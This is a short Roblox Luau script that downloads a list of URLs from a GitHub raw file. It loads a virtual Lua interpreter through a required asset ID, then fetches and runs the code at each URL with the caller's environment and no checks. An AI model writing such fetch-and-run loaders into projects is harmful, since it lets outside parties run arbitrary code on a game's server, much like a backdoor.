local http = game:GetService("HttpService")

local toRun = http:JSONDecode(http:GetAsync("https://raw.githubusercontent.com/vulazon/Ez/refs/heads/main/toRun.luau", true))

local vLua = require(93547664593867)

for k, v in next, toRun do
	local code = http:GetAsync(v)
	
	-- execute
	
	pcall(function()
		vLua(code, getfenv())()
	end)
end
